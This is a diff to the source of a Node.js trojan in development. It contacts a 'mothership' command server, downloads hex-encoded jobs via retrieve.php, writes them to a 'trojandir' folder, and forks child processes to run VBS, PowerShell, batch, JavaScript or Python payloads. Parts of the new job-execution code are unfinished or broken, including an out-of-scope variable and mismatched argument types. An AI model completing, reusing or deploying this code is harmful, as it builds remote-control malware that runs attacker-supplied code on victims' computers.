@@ -1,6 +1,7 @@
 // 20260705-0849
 // https://onecompiler.com/nodejs#draft-yf7t
 
+// IMPLEMENT
 // TODO
 // TEST
 // REVIEW
@@ -59,8 +60,6 @@ var processlist = [];
 
 // EXEC_VBS, EXEC_PS1, EXEC_BAT, EXEC_JS, EXEC_PY
 
-
-// TODO: modify systemstate for file paths, delay timers
 var systemstate = {
     staticdelay: 30,
 
@@ -140,6 +139,14 @@ var systemstate = {
     
         logmsg(`index:  ${this.mothershipindex} mothership: ${mothershiparr[this.mothershipindex]}`);
         return mothershiparr[this.mothershipindex];    
+    },
+
+    getClientJobPath() {
+        return path.join(this.trojandir, 'clientjob_'+getRandomCode(8));
+    },
+
+    get clientjobconfigpath() {
+        return path.join(this.trojandir, 'clientjobconfig_'+getRandomCode(8)+'.json');
     },
 
     __clientid: '',
@@ -372,7 +379,8 @@ class CmdConfig {
         pcmon: null,
         pspcmon: null,
         init: startup,
-        task: startup
+        task: startup,
+        execjob: execjob
     };
 
     get dynamicdelay() {
@@ -441,7 +449,8 @@ class CmdConfig {
         logmsg('finished');
     };
 
-    // used by watchdog to relay messages between ping and cmdlist
+    // used by watchdog to receive messages from child cmds (ping, cmdlist)
+    // ... relay messages between ping and cmdlist
     processMessage(msg) {
         logmsg('starting');
         
@@ -454,7 +463,7 @@ class CmdConfig {
         let dest = msg.dest;
         let payload = msg.payload;
         
-        let destcmd = parentcmd.getChildCmd(dest); // TEST anchor
+        let destcmd = parentcmd.getChildCmd(dest);
 
         if ( ! destcmd ) {
             throw new Error('could not obtain child cmd for '+dest);
@@ -465,6 +474,7 @@ class CmdConfig {
         logmsg('finished');
     };
 
+    // used by watchdog to send message to child cmds (ping, cmdlist)
     sendMessage(destcmd, src, msgpayload) {
         let childp = destcmd.childprocess;
 
@@ -485,20 +495,26 @@ class CmdConfig {
         }
 
         if ( childp.connected && ! childp.killed ) {
-            logmsg('sending message to child: '+ JSON.stringify(msgout)); // anchor
+            logmsg('sending message to child: '+ JSON.stringify(msgout));
 
             childp.send(msgout);
         }
 
     };
 
-    launch() {
+    launch(cmdlineargs) {
 
         logmsg("launching ["+this.cmdname+"]");
 
         // TODO: refactor to use #launchprocname and #launchscriptfname
         // ! this is only for node.exe and nodejs scripts
-        const child = fork(systemstate.trojanfpath, [this.cmdname]);
+
+        let child = null;
+        
+        if ( Array.isArray(cmdlineargs) && cmdlineargs.length )
+            child = fork(systemstate.trojanfpath, [this.cmdname, ...cmdlineargs]);
+        else
+            child = fork(systemstate.trojanfpath, [this.cmdname]);
         
         this.#__childprocess = child;
         this.#__launchprocname = path.basename(child.spawnargs[0]);
@@ -515,13 +531,14 @@ class CmdConfig {
         child.on('message', (message) => {
             logmsg('[YER]incomming message: ' + JSON.stringify(message));
 
-            this.processMessage(message);// anchor 202607042025
+            this.processMessage(message);
         });
         
         child.on('exit', (code) => {
             logmsg(`Child process ${child.pid} exited with code ${code}`);
         });
 
+        return child;
     };
 
     // TODO
@@ -989,6 +1006,7 @@ var handleMessage = function(msg) {
 }
 
 // receives messages from parent process -- should be used by cmdlist, ping
+
 process.on('message', (message) => {
     if ( ! message ) {
         throw new Error('null message');
@@ -997,12 +1015,15 @@ process.on('message', (message) => {
     logmsg(`[XAW]incomming message:` + JSON.stringify(message));
 
     if ( handleMessage ) {
-        handleMessage(message); // anchor
+        logmsg('handleMessage begin');
+        handleMessage(message);
+        logmsg('handleMessage end');
     }
 
 });
 
 // sends message to parent process -- should be called by cmdlist, ping
+
 async function sendMessage(dest, msgpayload) {
     let isvalid = (typeof process.send === 'function' && process.connected );
     const parentPid = process.ppid;
@@ -1167,44 +1188,29 @@ function processClientJob(rawtext) {
         let scripttext = extractText(rawtext, 'EXEC_'+token+'_BEGIN','EXEC_'+token+'_END');
 
         if ( ! isNullOrWhitespace(scripttext) ) {
+            let fpath = systemstate.getClientJobPath();
+            fs.writeFileSync(fpath, scripttext, 'utf8');
+
+            if ( ! fileExists(fpath) ) {
+                throw new Error('unable to write script text to file '+fpath);
+            }
+
             let clientjob = {
                 jobtype: 'EXEC_' + token,
                 jobcode: jobcode,
-                scripttext: scripttext
+                //scripttext: scripttext
+                localpath: fpath
             };
 
             return clientjob;
         }
     }
 
-    return clientjob;
+    return null;
 }
 
 function ping_handleMessage(message) {
 
-}
-
-function cmdlist_handleMessage(message) {
-    // senderPid:process.pid, src:systemstate.cmdname, dest:dest, payload:msgpayload, ts:getTimestamp
-
-    let senderPid = message.senderPid;
-    let src = message.src;
-    let dest = message.dest;
-    let clientjob = message.payload;
-
-    if ( dest != 'cmdlist' ) {
-        return;
-    }
-
-    if ( src != 'ping' ) {
-        return;
-    }
-
-    if ( ! clientjob ) {
-        return;
-    }
-
-    executeJob(clientjob);
 }
 
 async function ping_loop() {
@@ -1228,9 +1234,10 @@ async function ping_loop() {
     let clientjob = processClientJob(rawtext);
 
     if ( clientjob ) {
-        logmsg('sending job to cmdlist: jobcode='+clientjob.jobcode+' jobtype: '+clientjob.jobtype);
+        logmsg(`sending job to cmdlist: jobcode=${clientjob.jobcode} jobtype: ${clientjob.jobtype}`);
         await sendMessage('cmdlist', clientjob);
     }
+
 }
 
 function ping() {
@@ -1246,29 +1253,128 @@ function ping() {
     logmsg('finished');
 }
 
-function executeJob(clientjob) {  
+// TODO
+function execjob() {
     logmsg('starting');
-    
-    // ... 
 
+    if ( process.argv.length >= 4 ) {
+        // process.argv[2] --> cmdname
+        // process.argv[3] --> should be the json config file
+        let configfpath = process.argv[3];
+    }
+
+    if ( ! fileExists(configfpath) ) {
+        throw new Error('configfpath does not exist '+configfpath);
+    }
+
+    let jsonconfigstr = readTag(configfpath);
+
+    if ( isNullOrWhitespace(jsonconfigstr) ) {
+        throw new Error('jsonconfigstr is empty');
+    }
+
+    let clientjob = JSON.parse(jsonconfigstr);
+
+    let childproc = null;
+    // copy code from launch() method above
+
+    // grab cmd line arg localfpath to json file containing clientjob object
+
+    // for execute_cmdlist, exec_<vbs>, ... jobs:
+    // launch nodejs, python, cscript, cmd, powershell as needed to execut job
+
+    // for exec_cmd, execute cmd directly
+    //   write to event bus job started
+    //   write to event bus job finished
+    
     logmsg('finished');
 }
 
-// anchor
-// TODO: implement
-function cmdlist_handleMessage(msg) {
+async function retrieveClientJob() {
     logmsg('starting');
 
-    // TODO: check if msg is execute_cmdlist type job, if so invoke retrieve.php
-    // filename=...
+    let baseUrl = systemstate.mothership + '/ow/retrieve.php';
+    let params = systemstate.statekvp;
+    params.filename = 'execute_cmdlist';
 
-    let response = makeGetRequest();
+    let localpath = systemstate.getClientJobPath();
 
-    // parse msg and execute job
+    let downloadOpts = { download:true, filetype:'txt', localpath:localpath };
+    let response = await makeGetRequest(baseUrl, params, null, downloadOpts);
 
-    // for execute_cmdlist, grab job using retrieve.php
-    // other jobs, will have to send path to script file for execution
-    // ping has to create the script file
+    if ( ! response.headers ) {
+        throw new Error('could not access response headers');
+    }
+
+    if ( ! fileExists(localpath) ) {
+        throw new Error('job file does not exist');
+    }
+
+    let hextext = fs.readFileSync(localpath, 'utf-8');
+    let jobtext = Buffer.from(hextext, 'hex').toString('utf8');
+    localpath = systemstate.getClientJobPath();
+    fs.writeFileSync(localpath, jobtext);
+
+    let jobcode = '';
+    let jobfilename = '';
+
+    if ( Object.hasOwn(response.headers, 'X-JobCode') )
+        jobcode = response.headers['X-JobCode']; 
+    
+    if ( Object.hasOwn(response.headers, 'X-JobFilename') )
+        jobfilename = response.headers['X-JobFilename']; 
+
+    if ( isNullOrWhitespace(jobcode) ) {
+        throw new Error('jobcode is empty');
+    }
+
+    if ( isNullOrWhitespace(jobfilename) ) {
+        throw new Error('jobfilename is empty');
+    }
+
+    let clientjob = { jobcode:jobcode, jobtype:'execute_cmdlist', localpath:localpath, jobfilename: jobfilename };
+
+    logmsg('retrieved client job: '+JSON.stringify(clientjob));
+
+    logmsg('finished');
+    
+    return clientjob;
+}
+
+
+async function cmdlist_handleMessage(msg) {
+    logmsg('starting');
+
+    let clientjob = msg?.payload ?? null;
+
+    if ( ! clientjob ) {
+        throw new Error('unable to extract clientjob');
+    }
+
+    logmsg('received new client job: '+JSON.stringify(clientjob));
+
+    let jobtype = clientjob?.jobtype ?? '';
+    let jobcode = clientjob?.jobcode ?? '';
+
+    if ( jobtype.toLowerCase() == 'execute_cmdlist' ) {
+        clientjob = await retrieveClientJob();
+    }
+
+    let cmdlistcmd = systemstate.cmdconfig;
+
+    let execjobcmd = cmdlistcmd.newCmdConfig('execjob');
+
+    fs.writeFile(systemstate.clientjobconfigpath, JSON.stringify(clientjob));
+
+    if ( ! fileExists(systemstate.clientjobconfigpath) ) {
+        throw new Error('clientjobconfigpath does note exist ' + systemstate.clientjobconfigpath);
+    }
+
+    // IMPLEMENT script launching process
+    let ret = execjobcmd.launch(systemstate.clientjobconfigpath);
+
+    // TODO do basic checks to ensure child process is running
+
     logmsg('finished');
 }
 
@@ -1360,3 +1466,15 @@ function logEventMothership(event_code, kvp) {
 // ---
 
 
+/*
+
+    let clientjob = {
+        jobtype: 'EXEC_<ext>', 'execute_cmdlist', 'EXEC_CMD'
+        jobcode: 8 digit 0-9 random code,
+        localpath:'' local path of script text (n/a for EXEC_CMD)
+        jobfilename:'' --> need extension to execute script engine
+        cmdname: 'GetSystemOverview',
+        args: [ ... ]
+    };
+
+*/
